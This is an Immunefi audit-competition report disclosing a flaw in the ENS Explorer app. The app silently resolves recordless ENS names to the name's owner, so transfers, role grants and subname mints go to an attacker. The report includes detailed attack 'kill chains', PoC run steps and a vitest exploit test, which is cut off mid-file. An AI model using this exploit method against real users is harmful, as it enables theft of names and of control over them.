# 89728 w a critical explorer app fabricates a resolved for recordless ens names silently substitutes the name s owner sending name transfers and registry wide role grants to an attacker s ad&#x20;

## #89728 \[W\&A-Critical] Explorer app fabricates a 'Resolved:' for recordless ENS names - silently substitutes the name's owner, sending name transfers and registry-wide role grants to an attacker's ad...

**Submitted on Aug 20th 2026 at 20:05:45 UTC by @pizzalover337 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89728
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

### Description

### Summary

Across the Explorer app, every "enter an address or ENS name" input resolves a typed ENS name through one helper, `resolveAddressOrName`. That helper reads the name's addr record. When the name has **no addr record**, it silently substitutes the name's **current owner**, and the UI presents the result as a successful resolution ("Resolved:" in the add-user sheets, a full-address recipient preview in the transfer form), with no indication anywhere that nothing actually resolved.

On-chain, this fabrication is directly visible: for these names the canonical resolution path fails — the real UniversalResolver **reverts** `ResolverNotFound` on a resolverless name, and viem's resolution of a resolver-set-but-recordless one returns null (the empty/zero record) — both executed in the PoC. A recordless name designates *no address anywhere on-chain*; the app fabricates one. The two semantics it conflates are distinct: an addr record is the address the name's controller **designates** to receive things; the owner is **administrative control** of the name. For legitimate names these routinely differ (hot payment wallet vs. cold holding wallet).

When a victim types such a name into one of these inputs (the normal workflow for each), the substituted address feeds irreversible transaction builders with no further review:

1. **Name-transfer recipient** (`SendNameForm` → `transferToken` → `safeTransferFrom`) — the victim's name NFT moves to the attacker's address. Irreversible.
2. **Name-scoped role grants** (`RolesAddUserSheet` → `grantRoles`) — e.g. `ROLE_SET_RESOLVER` on the victim's name.
3. **Registry-root role grants** (`RegistryAddUserSheet` → `grantRootRoles`) — roles over **every name in the victim's registry**.
4. **Resolver role grants** (`ResolverAddUserSheet`, scope defaults to the ROOT node) — roles over **every name on the victim's shared permissioned resolver**.
5. **Subname ownership** (`create-subname`) — the new subname is minted directly to the attacker's address.

In the two most dangerous flows (3) and (4), the **final confirmation modal never displays the grantee address at all** — it says only "Grant registry roles" / "Grant resolver roles for (root)" — so the victim has no opportunity, even in principle, to catch the substitution.

An attacker exploits this by registering any name (\~$5/yr) and keeping its addr record unset (or setting no resolver at all — both shapes verified on the live deployment's fork), then getting the victim to type that name into one of these inputs — "send the name to `payroll-acme.eth`", "add our ops name `ops-acme.eth` as a manager". Without the fallback the app would fail closed: the input flips to its existing "unresolved" state ("Could not resolve an address for …", `AddressNameInput.tsx:70-74`) and submission is blocked, so the victim would ask for a raw address and the scam collapses — the attacker must hand over a bare `0x…` that carries none of the ENS name's borrowed trust. With the fallback, the app itself presents the attacker's address as the successful resolution of the attacker's own ENS name. Typing a recipient name into the recipient field and clicking Transfer/Save is the **normal app workflow**; the program's exclusion list bars only impacts requiring in-app user actions "that are not part of the normal app workflows", and this one is the normal workflow.

The app's own behavior mass-produces the bait: its transfer flow **defaults to detaching the resolver** (`SendNameForm.tsx:69-73`, `apps/portal/src/features/transfer/utils/buildTransferPlan.ts:33,40`), so every routinely sold or moved name becomes a recordless name whose owner is its new holder: exactly the bait shape for any later typed-name interaction.

Every leg of this is executed in the PoC (below) against a fork of the live Sepolia deployment using the app's real, unmodified code: the fabricated resolution, all five sink encoders decoded byte-exact, and three complete on-chain kill chains, each with the victim's only input being the attacker's recordless ENS name.

### Impact

Critical under the program's wrong-recipient impact title. Concretely, per victim, one typed name leads to one of:

* **Loss of an ENS name (NFT)** — the transfer sink executes `safeTransferFrom` to the substituted owner. Executed on-chain in the PoC: `balanceOf(victim) 1→0`, `balanceOf(attacker) 0→1`, `getOwnerV2` → attacker, tx `0xaf5df767…` on the fork (example run — see Proof of concept). ENS names are ERC-1155 assets with real market value; the transfer is irreversible.
* **Attacker control over the resolution of every name in the victim's registry** — the registry-root sink lands `grantRootRoles(ROLE_SET_RESOLVER, attacker)` (executed, tx `0xe8f3d8fe…`). The attacker can then repoint every name's records, intercepting all future payments and traffic to those names, and rotate in a malicious resolver. This is effective takeover of the registry's names, revocable only if the victim notices and still holds admin.
* **Attacker control over records of every name on the victim's permissioned resolver** — the resolver sink defaults to the ROOT node, so a routine "add a user" grant silently scopes to all names' records (`ROLE_SET_ADDR` executed at the encoder level).
* **Name-scoped role theft** — `grantRoles(ROLE_SET_RESOLVER, …)` on the victim's name (executed, tx `0xc3289782…`): the attacker repoints the name's resolution and intercepts future payments to it.
* **Subname theft at birth** — a subname the victim creates is minted directly to the attacker.

The attack is deterministic: no race, no staleness window, no error condition. Cost to the attacker is one ordinary registration — or zero, since any name they already hold (including one stripped of its resolver by the app's own transfer default) works as bait. There is no funds-send (ETH/ERC-20) flow consuming this helper — verified by enumeration; the harm is theft of names and of control over names, which converts to funds theft through resolution control.

**Pre-empting the "equivalence" objection** — *"an attacker could just set their name's addr record to themselves and steal identically; the fallback adds no capability."* It adds the capability that matters:

1. With an addr record, the name genuinely **designates** the attacker's address: that is ENS working as designed, visible to anyone, and not an app bug. With no addr record the name designates **nothing**, yet the app **fabricates** a resolution and presents it as successful — silently swapping "address the name designates" for "the name's owner", two semantics that differ for legitimate names too (payment address vs. holding wallet). Clearing a name's addr record must make interactions with it **fail**, not silently redirect them to the owner. Unfaithful resolution is exactly what the program's Critical title names.
2. The canonical ENS resolution path fails closed on recordless names — the UniversalResolver reverts and viem returns null — so users reasonably expect failure; the app violates that expectation silently. The developers themselves knew this resolution shape is deceptive: `isNameOrAddress.ts:18-21` excludes single-label names precisely because they would — in the source's own scare quotes — `'"resolve" via the owner fallback'`, yet the identical mechanism ships for multi-label names.
3. The app's own transfer flow defaults to stripping the resolver, so recordless names are commonplace — the fallback is a *routine* resolution path, not an exotic edge.
4. In the registry-root and resolver flows the confirmation modal shows **no address at all** — "the user saw the address" is impossible there.

**Pre-empting "the address is displayed"**: in the sheets the victim sees only `Resolved: 0x1234…abcd` — 8 of 40 hex chars (`truncateAddress(address, 6, 4)`, `AddressNameInput.tsx:60-69`), repeated truncated in the tx modal. `SendNameForm` shows the full address — but the victim typed a name precisely because they don't know the expected address, so there is nothing to check it against. The form's forward-verified primary-name preview cannot display the bait name (a recordless name fails forward verification), so nothing warns "this name did not resolve". No string anywhere in the app distinguishes record-resolution from owner-fallback.

**Honesty notes** (bounds of the finding, verified): expired names fail closed — past expiry+grace the owner read hits the zero-address path and the helper returns null (`apps/portal/src/utils/ens/resolveEnsOwner.ts:53`; executed on the fork), so there is no transfer-to-zero bricking variant; no ETH/ERC-20 send flow consumes the helper; the Manager app (`apps/manager`) has no analogous fallback — this finding is specific to the Explorer app.

### Root cause

One helper, one silent branch (`apps/portal/src/features/roles/helpers/addUser.handlers.ts:11-40`):

```ts
// Fallback for names that do not set an address record:
// use current ENS owner address so the role can still be granted.
```

When `getEnsAddress` returns null, the helper returns `getEnsOwner(name)` instead of failing. Every consumer inherits the substitution through two wrappers (`apps/portal/src/features/address/queries/getResolvedAddress.ts:18-32`, `apps/portal/src/features/address/hooks/useAddressResolution.ts:47-90`), and every consumer renders the result as a successful resolution:

* Transfer recipient: `apps/portal/src/features/transfer/components/SendNameForm.tsx:81-108` → `apps/portal/src/features/transfer/helpers/transferToken.ts:67-71` (`safeTransferFrom` to the substituted address).
* Name roles: `apps/portal/src/features/roles/components/RolesAddUserSheet.tsx:102-119` → `apps/portal/src/features/roles/helpers/grantRoles.ts:58-95`.
* Registry-root roles: `apps/portal/src/features/registry/components/v2/RegistryAddUserSheet.tsx:100-119`.
* Resolver roles (ROOT-node default): `apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx:38-39,127`.
* Subname owner: `apps/portal/src/routes/$name/create-subname.tsx:161-170`.

The comment's stated rationale is availability for **role grants** ("so the role can still be granted"). Its reuse as the **transfer recipient** and **subname owner** via the shared wrappers exceeds that rationale entirely — and even within the rationale, availability does not require *deceptive presentation*: nothing justifies presenting the substituted owner as a successful resolution.

On-chain, the fabricated nature of the "resolution" is executed in the PoC: the real UniversalResolver `resolveWithGateways(dns, addr(namehash))` reverts `0x77209fe8 = ResolverNotFound(bytes)` for the resolverless name while the app helper returns its owner.

### This is not an accepted convention — the ecosystem fails closed everywhere

Silent owner-substitution exists in no mainstream ENS tool, and the foundational spec forbids the exact behavior:

* **ENSIP-1 (normative)**: a resolver with no addr record for a node MUST return zero, and "clients resolving the `addr` record MUST check for a zero return value, and treat this in the same manner as a name that does not have a resolver specified - that is, **refuse to send funds to or interact with the address**" ([docs.ens.domains/ensip/1](https://docs.ens.domains/ensip/1)). The transfer sink here is precisely the scenario that text warns about.
* **viem** (`getEnsAddress` — "returns `null` if ENS name does not resolve to address"), **ensjs** (`getAddressRecord` — null if not found), and **ethers** all return null for recordless names; the on-chain UniversalResolver reverts `ResolverNotFound` for resolverless ones (ENSIP-23; executed in the PoC). None of them ever reads the owner.
* **ENS's own official manager app** (ens-app-v3) throws `No address found` in its add-manager role input when the typed name has no addr record ([`EditRoles/hooks/useSimpleSearch.ts`](https://github.com/ensdomains/ens-app-v3/blob/main/src/transaction-flow/input/EditRoles/hooks/useSimpleSearch.ts)) — i.e., ENS's flagship app fails closed in exactly the role-grant context the code comment cites as the fallback's rationale.
* ENS's founder on resolution semantics: "clients … **should not check or care about `owner` values when resolving names**" ([discuss.ens.domains/t/11899](https://discuss.ens.domains/t/how-does-ccip-read-work-on-a-contract-level/11899)).

The fallback also exceeds its own comment's scope: `useAddressResolution.ts:38-46` documents the helper as *shared by every "name or address" input in the app (transfer recipient, add-user sheets, …)* — a deliberate generalization of a role-grant availability shortcut into irreversible transfer and ownership paths. There are no unit tests for the helper.

### Why this is not a known issue

* **EXP-INPUT-005** (name validators accept deceptive characters) is explicitly scoped to *display* confusion — the entry states the impact is "homograph-style display confusion … **rather than incorrect resolution**". This finding **is** incorrect resolution: no lookalike or deceptive character is involved; a perfectly ordinary name simply has no addr record, and the app resolves it to something it never designated. Different mechanism, different component, and — by the program's own rule that materially new consequences of a listed root cause are in scope — a materially different consequence (irreversible wrong-recipient transactions, not display confusion).
* **Name-normalization issues** (raw label vs. UTS-46 reads elsewhere in the competition) are mechanistically disjoint: this finding needs no non-normalized input; the name is normalized correctly, and the bug is the resolution *semantics* after parsing.
* **QA-01 / WEB-1257 / WEB-1305** cover role-transfer flows *erroring or hanging* (functional breakage); here the transactions succeed exactly as built — the defect is *which address* they are built with.
* **R3-05…R3-08** concern transaction-manager archive/history bookkeeping; unrelated.
* Nothing else in the Known Issues list covers resolution-fallback behavior in the Explorer's name-or-address inputs.

### Scope note

The root cause is entirely in the in-scope Explorer app (`apps/portal`). The ENS contracts and UniversalResolver behave correctly — the UniversalResolver reverts `ResolverNotFound` on a resolverless name — and are not the subject of this report; no contract, subgraph/indexer, or metadata-service change is needed. The fix is wholly app-side (below). The on-chain kill chains are executed against the live Sepolia deployment's contracts only as the environment the in-scope app code runs against — the same arrangement as the program's own scope statement (apps in scope, contracts as deployment context).

### Recommendation

1. **Fail closed.** When a typed name has no addr record, recipient/grantee/subname-owner inputs must fail into the input's existing unresolved state ("Could not resolve an address for …") and block submission — matching what the canonical resolution path does.
2. **If the owner-fallback is retained for role grants** per the code comment's rationale, make it explicit and opt-in ("No address record — use the name's owner 0x… instead?"), never presented as a successful resolution, and remove it from the transfer-recipient and subname-owner sinks unconditionally.
3. **Display the full grantee/recipient address in every final confirmation modal** (the registry-root and resolver grant modals currently show none).

### Proof of concept

Three self-contained vitest files (full contents and step-by-step instructions in the Proof of Concept field), run against the app's own vitest config with a local anvil fork of live Sepolia (public RPC, no keys). Mocks are confined to external system boundaries (the two RPC reads plus a capture-only transaction-submission boundary in the unit leg; nothing else) — everything under test is the real application code, and the fork legs mock nothing at all beyond pointing the app's own supported RPC override at the fork.

**Unit leg** (`ownerFallbackResolution.unit.test.ts`, 8/8 passing) — the substitution and all five sink encoders, byte-exact:

* Real `resolveAddressOrName`: no addr record → returns the owner; with an addr record → returns the record (owner never read); raw `0x` input passes through.
* Real `prepareGrantRolesTransaction` → decoded `grantRoles(resource=labelToCanonicalId('victim'), bitmap=0x1000000 [ROLE_SET_RESOLVER], account=<substituted owner>)`.
* Real `prepareGrantRegistryRolesTransaction` → decoded `grantRootRoles(bitmap, account=<substituted owner>)` (ROOT\_RESOURCE).
* Real `prepareGrantResolverRolesTransaction` with the sheet's default ROOT scope → decoded `grantRootRoles` on the resolver.
* Real `transferToken` → decoded `safeTransferFrom(victim, <substituted owner>, tokenId, 1, 0x)`.
* Real `prepareCreateSubnameTransaction` → decoded `register('payroll', owner=<substituted owner>, …)`.

**Fork leg** (`ownerFallbackResolution.fork.test.ts`, 9/9 passing, anvil fork of live Sepolia, zero mocks) — the mechanism and three complete kill chains executed on-chain against the real deployment (v2 ETHRegistrar `0xa88553F454b77203B0D036A05c894d555EAAa2Cc`, registry `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`). Block and transaction hashes quoted below are from one example run (fork block 11523301); the PoC registers fresh names on every run, so a re-run produces its own block and hashes with the same assertions:

* Seed: real registrations through the real registrar of recordless attacker names (resolver `0x0`, and resolver-set-but-no-addr-record) and a victim name; real viem `getEnsAddress` against the real UniversalResolver returns **null** for both bait shapes; the real UniversalResolver reverts `ResolverNotFound(bytes)` for the resolverless one; the real app helper returns the attacker owner for both.
* **Kill chain 1 — transfer**: the app's real `transferToken` path, including its real transaction-manager submission, moves the victim's name NFT to the attacker (tx `0xaf5df7672728fe5c1720fd9cd44d260cd4c330a4cfa18fd606b3e7483929b22e`; `balanceOf(victim) 1→0`, `balanceOf(attacker) 0→1`, `getOwnerV2(name)` → attacker). The victim's only input was the attacker's recordless ENS name.
* **Kill chain 2 — name role**: real `prepareGrantRolesTransaction` broadcast as the victim lands `ROLE_SET_RESOLVER` for the attacker on the victim's name's resource (tx `0xc3289782e57433bd0335186dd9bd2f27713ee25f8450340cfafa9d4bc03e1d7c`; `hasRoles` `false→true`).
* **Kill chain 3 — registry-root**: real subregistry deployment via the app's own `prepareDeploySubregistryTransaction`, then real `prepareGrantRegistryRolesTransaction` broadcast as the victim lands a ROOT role for the attacker (tx `0xe8f3d8fea5a3031e56179085e4fd169aa3127aa01e1fc15eaf498831659ef8da`; `hasRoles(ROOT_RESOURCE, attacker, ROLE_SET_RESOLVER)` `false→true`) — registry-wide control from one typed name.
* **Edge probe** (`ownerFallbackExpiryEdge.fork.test.ts`, 3/3, included in the Proof of Concept field): expired names fail closed (helper returns null after grace) — no zero-address bricking variant.

One harness accommodation, disclosed: the app's EOA transport node-signs (`eth_sendTransaction` with a bare address); on the fork the victim account is impersonated so the node can sign — the submitted `from/to/data/value` are entirely the app-produced bytes; in production the connected wallet holds the key. The resolution path itself uses no cheatcodes and no mocks.

### Proof of Concept

## PoC — Explorer app fabricates a resolution for recordless ENS names (silent owner fallback → wrong-recipient transactions)

### What this demonstrates

Against a fork of the **live Sepolia deployment** and the **real, unmodified app code** at the audited revision:

1. **Fabricated resolution.** The Explorer's shared name-or-address helper `resolveAddressOrName` (`apps/portal/src/features/roles/helpers/addUser.handlers.ts:11-40`) reads a typed name's addr record through the UniversalResolver and, when the name has **no addr record**, silently returns the name's **current owner** — presented as a successful resolution everywhere downstream ("Resolved:" in the add-user sheets; a full-address recipient preview in the transfer form) with no indication that nothing resolved. On-chain, the real UniversalResolver **reverts** `ResolverNotFound(bytes)` (selector `0x77209fe8`) for the resolverless bait name and returns an empty addr for the resolver-set-but-recordless one: a recordless name designates *no address anywhere on-chain*; the app invents one. Executed with real viem `getEnsAddress` and the real app helper against the fork.
2. **All five sink encoders, byte-exact** (unit leg): the substituted owner flows through the app's real transaction builders — `transferToken` → `safeTransferFrom(victim, owner, tokenId, 1)`, `prepareGrantRolesTransaction` → `grantRoles(resource, ROLE_SET_RESOLVER, owner)`, `prepareGrantRegistryRolesTransaction` → `grantRootRoles(…, owner)` on `ROOT_RESOURCE`, `prepareGrantResolverRolesTransaction` → `grantRootRoles(…, owner)` on the resolver at the sheet's default ROOT scope, and `prepareCreateSubnameTransaction` → `register(label, owner, …)`. Every calldata blob asserted is produced by unmodified app helpers and decoded in the test.
3. **Three executed on-chain kill chains** (fork leg, anvil fork of live Sepolia @ block **11523301**), each with the victim's *only* input being the attacker's recordless ENS name:
   * **Transfer** — the real `transferToken` path (including the app's real transaction manager and EOA signer) moves the victim's name NFT to the attacker: `balanceOf(victim) 1→0`, `balanceOf(attacker) 0→1` on the real registry `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`, `getOwnerV2(name)` → attacker. Tx `0xaf5df7672728fe5c1720fd9cd44d260cd4c330a4cfa18fd606b3e7483929b22e`.
   * **Name role grant** — real `prepareGrantRolesTransaction` broadcast as the victim lands `ROLE_SET_RESOLVER` for the attacker on the victim's name's resource: `hasRoles` `false→true`. Tx `0xc3289782e57433bd0335186dd9bd2f27713ee25f8450340cfafa9d4bc03e1d7c`.
   * **Registry-root grant** — a real subregistry deployed through the app's own `prepareDeploySubregistryTransaction` (tx `0x27aa66d7d42f80674e4f82f9448f6a6ef6a7cd3c7fe91e0f39a4cf48631fe01c`), then real `prepareGrantRegistryRolesTransaction` broadcast as the victim lands a ROOT role for the attacker: `hasRoles(ROOT_RESOURCE, attacker, ROLE_SET_RESOLVER)` `false→true` — registry-wide control from one typed name. Tx `0xe8f3d8fea5a3031e56179085e4fd169aa3127aa01e1fc15eaf498831659ef8da`.
4. **Boundary honesty probe** (shipped in this document, below): `apps/portal/poc/ownerFallbackExpiryEdge.fork.test.ts` (3/3) executes the expired-name edge — after expiry (already within grace, and past grace) the owner reads `0x0` and the helper returns `null`, i.e. expired names fail closed and there is no transfer-to-zero bricking variant.

Mocks are confined to external system boundaries. The **unit leg** stubs exactly two RPC reads (`viem/actions.getEnsAddress` → null; the `getEnsOwner` owner read → attacker) and captures the tx-submission boundary — their real on-chain behavior is then proven in the fork leg. The **fork leg mocks nothing at all**: the only redirection is the app's own supported RPC override (`VITE_SEPOLIA_RPC_URL`, `lib/wagmi.ts:27-28`) pointed at the fork, so the app's real `wagmiConfig`, resolution helpers, ensjs reads, and transaction manager all execute unmodified against the real deployment's state.

### Prerequisites

* Node v22+ and pnpm v10 (`corepack enable`)
* [foundry](https://getfoundry.sh/)'s `anvil` on `PATH` (or set `ANVIL_BIN` to its full path)
* Network access to a public Sepolia RPC (default `https://ethereum-sepolia-rpc.publicnode.com`, overridable in the file). **No RPC keys, wallets, or funds needed** — the Sepolia test DAI has a public mint, used on the fork to pay live registration prices.
* The fork test spawns its own anvil on port **8556**; make sure no other anvil is listening there (`lsof -iTCP:8556`).

### Steps

1. Clone the competition repository and check out the audited revision:

   ```bash
   git clone https://github.com/immunefi-team/audit-comp-ens
   cd audit-comp-ens
   git checkout cda79acaad59711b943fc68207ebb3f1d0ff8596   # tree identical to the competition's audited revision 63772fd872af472ced58b009499355f3430c2a86
   pnpm install --frozen-lockfile
   ```
2. Save the three PoC files below as `apps/portal/poc/ownerFallbackResolution.unit.test.ts`, `apps/portal/poc/ownerFallbackResolution.fork.test.ts` and `apps/portal/poc/ownerFallbackExpiryEdge.fork.test.ts` — the three \`\`\`ts blocks at the bottom of this document, in that order, each under its own "PoC file" heading (they run with the app's own vitest config — no custom setup):

   ```bash
   mkdir -p apps/portal/poc   # the directory does not exist in a fresh clone
   ```
3. Run the unit leg (deterministic, no network):

   ```bash
   cd apps/portal && node_modules/.bin/vitest run poc/ownerFallbackResolution.unit
   ```

   Expected output (timings omitted):

   ```
    ✓ poc/ownerFallbackResolution.unit.test.ts (8 tests)
        ✓ control: a raw 0x input passes through untouched (no resolution at all)
        ✓ control: a name WITH an addr record returns the record — the owner fallback is NOT consulted
        ✓ CORE: a name with NO addr record silently resolves to its CURRENT OWNER (the attacker)
        ✓ sink 2 (role grantee): prepareGrantRolesTransaction encodes grantRoles(…, attacker) with the ROLE_SET_RESOLVER bit
        ✓ sink 3 (registry-root grantee): prepareGrantRegistryRolesTransaction encodes grantRootRoles(…, attacker) on ROOT_RESOURCE
        ✓ sink 4 (resolver grantee, default ROOT scope): prepareGrantResolverRolesTransaction encodes grantRootRoles(…, attacker) on the resolver
        ✓ sink 1 (transfer recipient): transferToken encodes safeTransferFrom(victim, ATTACKER, tokenId, 1) — the name NFT itself
        ✓ sink 5 (subname owner): prepareCreateSubnameTransaction encodes register(label, ATTACKER, …)
    Test Files  1 passed (1)
         Tests  8 passed (8)
   ```
4. Run the fork leg (spawns an anvil fork of live Sepolia; end-to-end a few minutes — registrations pay live prices through the real commit → reveal → register flow, and per-test timeouts are sized for slow public-RPC days):

   ```bash
   cd apps/portal && node_modules/.bin/vitest run poc/ownerFallbackResolution.fork
   ```

   Expected output (timings omitted; addresses, labels and tx hashes are freshly generated each run — the ones quoted in "What this demonstrates" are from the run at fork block 11523301):

   ```
    ✓ poc/ownerFallbackResolution.fork.test.ts (9 tests)
        ✓ setup: registers name A (resolver=0x0 — the app transfer flow’s detach default) and name B (official public resolver, no records) on the real v2 registrar
        ✓ boundary truth: REAL viem getEnsAddress against the REAL UniversalResolver returns null for BOTH names (no addr record)
        ✓ direct eth_call: UR resolveWithGateways(addr) REVERTS for name A while ensjs getOwnerV2 returns the attacker as owner
        ✓ CORE: the REAL resolveAddressOrName (app wagmiConfig → fork) returns the ATTACKER (owner) for the resolverless name A
        ✓ CORE: the REAL resolveAddressOrName returns the ATTACKER (owner) for the resolver-set-but-recordless name B
        ✓ victim setup: registers a real v2 name on the real registrar and holds ROLE_SET_RESOLVER(+_ADMIN) on it
        ✓ KILL CHAIN 1 (transfer): typed recordless name → REAL resolution → REAL transferToken → the ERC-1155 name token sits with the ATTACKER on-chain
        ✓ KILL CHAIN 2 (role grant): typed recordless name → REAL resolution → REAL prepareGrantRolesTransaction → broadcast → hasRoles(attacker, ROLE_SET_RESOLVER) true on-chain
        ✓ KILL CHAIN 3 (registry-root): deploy a REAL subregistry via the portal prepare path, then grantRootRoles to the fallback-resolved attacker → hasRoles(ROOT, attacker) true on-chain
    Test Files  1 passed (1)
         Tests  9 passed (9)
   ```

   (Noise to ignore: pino `core/relayer` JSON log lines from the WalletConnect SDK on stdout; a Lit dev-mode warning and a Reown remote-config fetch failure on stderr; transient `ECONNREFUSED 127.0.0.1:8556` while anvil boots; an `IndexedDB unavailable` warning from the transaction manager's persistence, which falls back to localStorage by design; happy-dom `AbortError` lines at teardown. None of these affect the result.)
5. Run the expired-name edge probe (same pattern; its own anvil on port 8557):

   ```bash
   cd apps/portal && node_modules/.bin/vitest run poc/ownerFallbackExpiryEdge.fork
   ```

   Expected output (timings omitted):

   ```
    ✓ poc/ownerFallbackExpiryEdge.fork.test.ts (3 tests)
        ✓ registers a short-lived recordless name; sanity: fallback resolves to owner while live
        ✓ within grace period (expired but < 28d): documents what the fallback returns
        ✓ past expiry + grace: fallback must fail CLOSED (null), never 0x0
    Test Files  1 passed (1)
         Tests  3 passed (3)
   ```

### How to read the result

* **Unit leg, controls** — a raw `0x` input passes through untouched, and a name *with* an addr record returns the record with the owner read never consulted: the fallback fires only on the no-record branch, exactly the branch the bait names occupy.
* **Unit leg, CORE** — with the addr read answering null and the owner read answering the attacker (the exact on-chain condition the fork leg later proves), the real `resolveAddressOrName` returns the attacker. This is the substitution; every sink test then feeds *that return value* through the real builders and decodes the resulting calldata: the substituted address lands in `safeTransferFrom`'s `to`, in `grantRoles`/`grantRootRoles`' `account`, and in `register`'s `owner`. The encoders are the same functions the sheets/forms call, so the bytes asserted are the bytes the app would submit.
* **Fork leg, boundary truth + direct eth\_call** — proves the unit leg's stubbed scenario is the real chain behavior: real viem `getEnsAddress` against the real UniversalResolver returns `null` for both bait shapes, and the raw UniversalResolver call reverts `0x77209fe8 = ResolverNotFound(bytes)` for the resolverless one while ensjs `getOwnerV2` returns the attacker for the same name — the two reads the fallback silently swaps.
* **Fork leg, CORE** — the unmodified helper, wired through the app's own `wagmiConfig` (only the RPC endpoint redirected), returns the attacker for both bait names. If the app's internal owner read had not executed against the fork, the helper would have returned `null` and these assertions would fail — so the whole real path is exercised.
* **Fork leg, victim setup** — the victim's name is registered through the real registrar, and the test reads back (and logs) that the registrar granted the owner both `ROLE_SET_RESOLVER` and `ROLE_SET_RESOLVER_ADMIN`: the grant kill chain is genuinely authorized, not harness-privileged.
* **Fork leg, KILL CHAIN 1** — the harm executed end-to-end through the app's own submission machinery: `transferToken` builds *and* submits the tx; on-chain balances flip `1→0` / `0→1` and `getOwnerV2` returns the attacker. The name NFT is gone, irreversibly, from one typed recordless name.
* **Fork leg, KILL CHAIN 2** — the real grant intent decoded (grantee = attacker, `ROLE_SET_RESOLVER` bit set, correct name resource) and broadcast as the victim; `hasRoles` flips `false→true`. The attacker can now repoint the victim's name resolution.
* **Fork leg, KILL CHAIN 3** — same mechanism one scope up: a real subregistry deployed the way the app's ConfigureRegistryForm deploys it, then the real ROOT-scope grant intent lands the attacker a registry-wide role (`hasRoles` at `ROOT_RESOURCE` `false→true`). The test also reads back the deployer's admin bit first (`victim ROLE_SET_RESOLVER_ADMIN at ROOT = true`) and contains an honest negative branch: had the deployer lacked the admin bit, it would have broadcast anyway and asserted the revert rather than assumed success.
* **Harness accommodation, disclosed** — the app's EOA transport submits with a bare `account` address (`eoa-transport.actor.ts:53`), which viem translates to node-signing (`eth_sendTransaction`); in production the connected wallet holds the key and answers it. On the fork the victim is `anvil_impersonateAccount`-ed so the node can sign — the submitted `from/to/data/value` are entirely the app-produced bytes. The resolution path itself uses no cheatcodes and no mocks. Anvil's default key #0 is never used for registrations (it is 7702-delegated on live Sepolia); all actors are fresh code-free EOAs.
* **Edge probe (third file, shipped below)** — `apps/portal/poc/ownerFallbackExpiryEdge.fork.test.ts` (3/3 passing, same run pattern) bounds the finding: expired names fail closed (helper returns `null` already within grace and past grace), so no zero-address recipient variant exists.

### PoC file (ownerFallbackResolution.unit.test.ts)

```ts
import {
  type Address,
  createWalletClient,
  decodeFunctionData,
  getAddress,
  http,
  labelhash,
  parseAbi,
} from 'viem'
import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts'
import { beforeEach, describe, expect, it, vi } from 'vitest'

const h = vi.hoisted(() => ({
  getEnsAddress: vi.fn(),
  getEnsOwner: vi.fn(),
  capturedIntent: null as null | {
    type: string
    request: { to: Address; data: `0x${string}`; from: Address }
  },
}))

vi.mock('viem/actions', async (importOriginal) => {
  const actual = await importOriginal<typeof import('viem/actions')>()
  return { ...actual, getEnsAddress: (...args: unknown[]) => h.getEnsAddress(...args) }
})

vi.mock('@/features/profile/hooks/useEnsOwner', async (importOriginal) => {
  const actual =
    await importOriginal<typeof import('@/features/profile/hooks/useEnsOwner')>()
  return { ...actual, getEnsOwner: (...args: unknown[]) => h.getEnsOwner(...args) }
})

vi.mock('@ens-apps/transaction-manager', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@ens-apps/transaction-manager')>()
  return {
    ...actual,
    transactionManager: {
      ...actual.transactionManager,
      startTransaction: (intent: typeof h.capturedIntent) => {
        h.capturedIntent = intent
        return 'tx-captured'
      },
    },
    waitForTransaction: async () => ({ hash: `0x${'ab'.repeat(32)}` }),
  }
})

import { resolveAddressOrName } from '@/features/roles/helpers/addUser.handlers'
import { prepareCreateSubnameTransaction } from '@/features/registry/utils/create-subname.helpers'
import { prepareGrantRegistryRolesTransaction } from '@/features/registry/helpers/grantRegistryRoles'
import { prepareGrantResolverRolesTransaction } from '@/features/resolver/helpers/grantResolverRoles'
import { prepareGrantRolesTransaction } from '@/features/roles/helpers/grantRoles'
import { transferToken } from '@/features/transfer/helpers/transferToken'
import { sepoliaWithEns } from '@/lib/wagmi'
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'

const LOG = (...args: unknown[]) => console.log('[owner-fallback:unit]', ...args)

const ATTACKER: Address = getAddress('0x00000000000000000000000000000000deadbeef')
const RECORD_HOLDER: Address = getAddress('0x000000000000000000000000000000000000C0DE')

const REGISTRY: Address = getAddress('0x00000000000000000000000000000000000B1A55')
const RESOLVER: Address = getAddress('0x000000000000000000000000000000000000E501')
const TYPED_NAME = 'lookalike-friend.eth'

const victimAccount = privateKeyToAccount(generatePrivateKey())
const walletClient = createWalletClient({
  account: victimAccount,
  chain: sepoliaWithEns,
  transport: http('http://127.0.0.1:1'), // never used: all builders are pure encoders
})

const okResult = (value: unknown) => ({ isOk: () => true, value })

const grantRolesAbi = parseAbi([
  'function grantRoles(uint256 resource, uint256 roleBitmap, address account)',
])
const grantRootRolesAbi = parseAbi([
  'function grantRootRoles(uint256 roleBitmap, address account)',
])
const authorizeNameRolesAbi = parseAbi([
  'function authorizeNameRoles(bytes name, uint256 roleBitmap, address account, bool)',
])
const safeTransferFromAbi = parseAbi([
  'function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes data)',
])
const registerAbi = parseAbi([
  'function register(string label, address owner, address subregistry, address resolver, uint256 roleBitmap, uint64 expires)',
])

beforeEach(() => {
  h.getEnsAddress.mockReset()
  h.getEnsOwner.mockReset()
  h.capturedIntent = null
})

describe('owner-fallback (unit leg): resolveAddressOrName → attacker owner feeds every sink', () => {
  it('control: a raw 0x input passes through untouched (no resolution at all)', async () => {
    const out = await resolveAddressOrName({
      client: {} as never,
      nameOrAddress: RECORD_HOLDER,
    })
    expect(out).toBe(RECORD_HOLDER)
    expect(h.getEnsAddress).not.toHaveBeenCalled()
    expect(h.getEnsOwner).not.toHaveBeenCalled()
  })

